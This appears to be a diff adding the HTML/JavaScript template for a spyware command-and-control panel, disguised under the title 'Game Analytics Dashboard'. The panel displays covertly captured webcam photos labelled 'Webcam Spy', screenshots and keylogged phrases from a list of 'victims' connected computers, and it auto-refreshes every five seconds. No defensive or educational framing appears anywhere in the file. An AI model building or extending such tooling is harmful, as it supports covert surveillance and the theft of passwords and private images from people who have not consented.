@@ -1,0 +1,541 @@
+<!-- templates/dashboard.html - COMPLETE FILE -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Game Analytics Dashboard</title>
+    <style>
+        :root {
+            --webcam: #e74c3c;   /* Red */
+            --screen: #3498db;   /* Blue */
+            --keys: #2ecc71;     /* Green */
+        }
+        
+        body {
+            margin: 0;
+            padding: 15px;
+            background: #1a252f;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+        
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            background: rgba(0,0,0,0.3);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .stat-box {
+            text-align: center;
+        }
+        
+        .stat-num {
+            font-size: 24px;
+            font-weight: bold;
+            display: block;
+        }
+        
+        .stat-label {
+            font-size: 14px;
+            color: #95a5a6;
+        }
+        
+        .dashboard {
+            display: flex;
+            gap: 15px;
+            height: calc(100vh - 120px);
+        }
+        
+        .panel {
+            flex: 1;
+            background: rgba(255,255,255,0.05);
+            border-radius: 10px;
+            padding: 15px;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        
+        .webcam-panel { border-top: 4px solid var(--webcam); }
+        .screen-panel { border-top: 4px solid var(--screen); }
+        .keys-panel { border-top: 4px solid var(--keys); }
+        
+        .panel-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid;
+        }
+        
+        .webcam-panel .panel-header { border-color: var(--webcam); }
+        .screen-panel .panel-header { border-color: var(--screen); }
+        .keys-panel .panel-header { border-color: var(--keys); }
+        
+        .panel-title {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: bold;
+        }
+        
+        .webcam-panel .panel-title { color: var(--webcam); }
+        .screen-panel .panel-title { color: var(--screen); }
+        .keys-panel .panel-title { color: var(--keys); }
+        
+        .content {
+            flex: 1;
+            overflow-y: auto;
+            padding-right: 5px;
+        }
+        
+        /* Images grid */
+        .images-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 12px;
+        }
+        
+        .image-card {
+            background: rgba(255,255,255,0.08);
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        
+        .image-card img {
+            width: 100%;
+            height: 160px;
+            object-fit: cover;
+            cursor: pointer;
+        }
+        
+        .image-info {
+            padding: 10px;
+        }
+        
+        .image-meta {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+        
+        /* Keystrokes */
+        .phrases-list {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        
+        .phrase-card {
+            background: rgba(46,204,113,0.1);
+            border-radius: 8px;
+            padding: 12px;
+            border-left: 3px solid var(--keys);
+        }
+        
+        .phrase-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+        
+        .phrase-computer {
+            background: var(--keys);
+            color: white;
+            padding: 2px 10px;
+            border-radius: 12px;
+            font-size: 13px;
+        }
+        
+        .phrase-time {
+            color: #27ae60;
+            font-size: 13px;
+        }
+        
+        .phrase-text {
+            font-family: monospace;
+            background: rgba(0,0,0,0.2);
+            padding: 10px;
+            border-radius: 6px;
+            word-break: break-word;
+        }
+        
+        /* Buttons */
+        button {
+            background: rgba(255,255,255,0.1);
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+        
+        button:hover {
+            background: rgba(255,255,255,0.2);
+        }
+        
+        /* Victims */
+        .victims {
+            margin-top: 15px;
+            padding-top: 10px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .victims-list {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-top: 8px;
+        }
+        
+        .victim-tag {
+            background: #9b59b6;
+            padding: 4px 12px;
+            border-radius: 15px;
+            font-size: 13px;
+        }
+        
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: rgba(255,255,255,0.05);
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: rgba(255,255,255,0.2);
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <!-- Stats -->
+    <div class="stats">
+        <div class="stat-box">
+            <span class="stat-num" id="stat-webcam">{{ stats.webcam }}</span>
+            <span class="stat-label">Webcam Photos</span>
+        </div>
+        <div class="stat-box">
+            <span class="stat-num" id="stat-screen">{{ stats.screenshots }}</span>
+            <span class="stat-label">Screenshots</span>
+        </div>
+        <div class="stat-box">
+            <span class="stat-num" id="stat-keys">{{ stats.keystrokes }}</span>
+            <span class="stat-label">Keystrokes</span>
+        </div>
+        <div class="stat-box">
+            <span class="stat-num">{{ victims|length }}</span>
+            <span class="stat-label">Computers</span>
+        </div>
+    </div>
+    
+    <!-- 3-Column Dashboard -->
+    <div class="dashboard">
+        <!-- Webcam Panel -->
+        <div class="panel webcam-panel">
+            <div class="panel-header">
+                <h3 class="panel-title">
+                    <i class="fas fa-video"></i> Webcam Spy
+                </h3>
+                <button onclick="refreshWebcam()">Refresh</button>
+            </div>
+            <div class="content" id="webcam-content">
+                {% if webcam %}
+                <div class="images-grid">
+                    {% for img in webcam|reverse %}
+                    <div class="image-card">
+                        <img src="{{ url_for('get_image', filename=img.thumbnail) }}" 
+                             onclick="showImage('{{ img.filepath }}')">
+                        <div class="image-info">
+                            <div class="image-meta">
+                                <span style="color: var(--webcam);">{{ img.computer }}</span>
+                                <span style="color: #95a5a6;">{{ img.time }}</span>
+                            </div>
+                            <div style="font-size: 12px; color: #bdc3c7;">
+                                #{{ img.id }} • {{ img.size_kb }}KB
+                            </div>
+                        </div>
+                    </div>
+                    {% endfor %}
+                </div>
+                {% else %}
+                <div style="text-align: center; padding: 40px; color: #95a5a6;">
+                    <i class="fas fa-video fa-2x"></i>
+                    <p>No webcam photos yet</p>
+                </div>
+                {% endif %}
+            </div>
+        </div>
+        
+        <!-- Screenshot Panel -->
+        <div class="panel screen-panel">
+            <div class="panel-header">
+                <h3 class="panel-title">
+                    <i class="fas fa-camera"></i> Screenshots
+                </h3>
+                <button onclick="refreshScreenshots()">Refresh</button>
+            </div>
+            <div class="content" id="screenshot-content">
+                {% if screenshots %}
+                <div class="images-grid">
+                    {% for img in screenshots|reverse %}
+                    <div class="image-card">
+                        <img src="{{ url_for('get_image', filename=img.thumbnail) }}" 
+                             onclick="showImage('{{ img.filepath }}')">
+                        <div class="image-info">
+                            <div class="image-meta">
+                                <span style="color: var(--screen);">{{ img.computer }}</span>
+                                <span style="color: #95a5a6;">{{ img.time }}</span>
+                            </div>
+                            <div style="font-size: 12px; color: #bdc3c7;">
+                                #{{ img.id }} • {{ img.size_kb }}KB
+                            </div>
+                        </div>
+                    </div>
+                    {% endfor %}
+                </div>
+                {% else %}
+                <div style="text-align: center; padding: 40px; color: #95a5a6;">
+                    <i class="fas fa-camera fa-2x"></i>
+                    <p>No screenshots yet</p>
+                </div>
+                {% endif %}
+            </div>
+        </div>
+        
+        <!-- Keystrokes Panel -->
+        <div class="panel keys-panel">
+            <div class="panel-header">
+                <h3 class="panel-title">
+                    <i class="fas fa-keyboard"></i> Keystrokes
+                </h3>
+                <button onclick="refreshKeystrokes()">Refresh</button>
+            </div>
+            <div class="content" id="keys-content">
+                {% if keystrokes %}
+                <div class="phrases-list">
+                    {% for phrase in keystrokes|reverse %}
+                    <div class="phrase-card">
+                        <div class="phrase-header">
+                            <span class="phrase-computer">{{ phrase.computer }}</span>
+                            <span class="phrase-time">{{ phrase.time }}</span>
+                        </div>
+                        <div class="phrase-text">
+                            {{ phrase.phrase }}
+                        </div>
+                        <div style="font-size: 12px; color: #27ae60; margin-top: 5px;">
+                            #{{ phrase.id }} • {{ phrase.date }}
+                        </div>
+                    </div>
+                    {% endfor %}
+                </div>
+                {% else %}
+                <div style="text-align: center; padding: 40px; color: #95a5a6;">
+                    <i class="fas fa-keyboard fa-2x"></i>
+                    <p>No keystrokes yet</p>
+                </div>
+                {% endif %}
+            </div>
+            
+            <div class="victims">
+                <h4 style="margin: 0 0 10px 0; color: #95a5a6;">
+                    <i class="fas fa-desktop"></i> Connected Computers
+                </h4>
+                <div class="victims-list" id="victims-list">
+                    {% for victim in victims %}
+                    <div class="victim-tag">{{ victim }}</div>
+                    {% endfor %}
+                </div>
+            </div>
+        </div>
+    </div>
+    
+  <!-- Remplacer toute la section JavaScript (ligne ~200 à la fin) par : -->
+
+<script>
+    // Refresh functions
+    async function refreshWebcam() {
+        const res = await fetch('/api/webcam');
+        const data = await res.json();
+        updateWebcam(data);
+    }
+    
+    async function refreshScreenshots() {
+        const res = await fetch('/api/screenshots');
+        const data = await res.json();
+        updateScreenshots(data);
+    }
+    
+    async function refreshKeystrokes() {
+        const res = await fetch('/api/keystrokes');
+        const data = await res.json();
+        updateKeystrokes(data);
+    }
+    
+    async function refreshVictims() {
+        try {
+            const res = await fetch('/api/victims');
+            const data = await res.json();
+            updateVictims(data.computers);
+        } catch (error) {
+            console.error("Error refreshing victims:", error);
+        }
+    }
+    
+    async function updateStats() {
+        const res = await fetch('/api/stats');
+        const stats = await res.json();
+        document.getElementById('stat-webcam').textContent = stats.webcam;
+        document.getElementById('stat-screen').textContent = stats.screenshots;
+        document.getElementById('stat-keys').textContent = stats.keystrokes;
+        // La 4ème boîte (Computers) se met à jour automatiquement via updateVictims()
+    }
+    
+    // Update displays
+    function updateWebcam(photos) {
+        const container = document.getElementById('webcam-content');
+        if (photos.length === 0) {
+            container.innerHTML = `
+                <div style="text-align: center; padding: 40px; color: #95a5a6;">
+                    <i class="fas fa-video fa-2x"></i>
+                    <p>No webcam photos yet</p>
+                </div>
+            `;
+            return;
+        }
+        
+        let html = '<div class="images-grid">';
+        photos.reverse().forEach(img => {
+            html += `
+                <div class="image-card">
+                    <img src="/image/${img.thumbnail}" onclick="showImage('${img.filepath}')">
+                    <div class="image-info">
+                        <div class="image-meta">
+                            <span style="color: #e74c3c;">${img.computer}</span>
+                            <span style="color: #95a5a6;">${img.time}</span>
+                        </div>
+                        <div style="font-size: 12px; color: #bdc3c7;">
+                            #${img.id} • ${img.size_kb}KB
+                        </div>
+                    </div>
+                </div>
+            `;
+        });
+        html += '</div>';
+        container.innerHTML = html;
+    }
+    
+    function updateScreenshots(shots) {
+        const container = document.getElementById('screenshot-content');
+        if (shots.length === 0) {
+            container.innerHTML = `
+                <div style="text-align: center; padding: 40px; color: #95a5a6;">
+                    <i class="fas fa-camera fa-2x"></i>
+                    <p>No screenshots yet</p>
+                </div>
+            `;
+            return;
+        }
+        
+        let html = '<div class="images-grid">';
+        shots.reverse().forEach(img => {
+            html += `
+                <div class="image-card">
+                    <img src="/image/${img.thumbnail}" onclick="showImage('${img.filepath}')">
+                    <div class="image-info">
+                        <div class="image-meta">
+                            <span style="color: #3498db;">${img.computer}</span>
+                            <span style="color: #95a5a6;">${img.time}</span>
+                        </div>
+                        <div style="font-size: 12px; color: #bdc3c7;">
+                            #${img.id} • ${img.size_kb}KB
+                        </div>
+                    </div>
+                </div>
+            `;
+        });
+        html += '</div>';
+        container.innerHTML = html;
+    }
+    
+    function updateKeystrokes(phrases) {
+        const container = document.getElementById('keys-content');
+        if (phrases.length === 0) {
+            container.innerHTML = `
+                <div style="text-align: center; padding: 40px; color: #95a5a6;">
+                    <i class="fas fa-keyboard fa-2x"></i>
+                    <p>No keystrokes yet</p>
+                </div>
+            `;
+            return;
+        }
+        
+        let html = '<div class="phrases-list">';
+        phrases.reverse().forEach(p => {
+            html += `
+                <div class="phrase-card">
+                    <div class="phrase-header">
+                        <span class="phrase-computer">${p.computer}</span>
+                        <span class="phrase-time">${p.time}</span>
+                    </div>
+                    <div class="phrase-text">${p.phrase}</div>
+                    <div style="font-size: 12px; color: #27ae60; margin-top: 5px;">
+                        #${p.id} • ${p.date}
+                    </div>
+                </div>
+            `;
+        });
+        html += '</div>';
+        container.innerHTML = html;
+    }
+    
+    // NOUVELLE FONCTION POUR LES VICTIMS
+    function updateVictims(victims) {
+        const container = document.getElementById('victims-list');
+        const statBox = document.querySelector('.stats .stat-box:nth-child(4) .stat-num');
+        
+        if (!victims || victims.length === 0) {
+            container.innerHTML = `
+                <div style="text-align: center; padding: 15px; color: #95a5a6; font-style: italic;">
+                    <i class="fas fa-desktop" style="margin-right: 5px;"></i>
+                    No computers connected yet
+                </div>
+            `;
+            if (statBox) statBox.textContent = '0';
+            return;
+        }
+        
+        let html = '';
+        victims.forEach(victim => {
+            html += `<div class="victim-tag">${victim}</div>`;
+        });
+        
+        container.innerHTML = html;
+        if (statBox) statBox.textContent = victims.length;
+    }
+    
+    // Show full image
+    function showImage(path) {
+        window.open('/image/' + path, '_blank');
+    }
+    
+    // Auto-refresh every 5 seconds - AJOUTER refreshVictims()
+    setInterval(() => {
+        refreshWebcam();
+        refreshScreenshots();
+        refreshKeystrokes();
+        refreshVictims();  // <-- AJOUTER CETTE LIGNE
+        updateStats();
+    }, 5000);
+    
+    // Initial load
+    refreshVictims();
+</script>
+</body>
+</html>
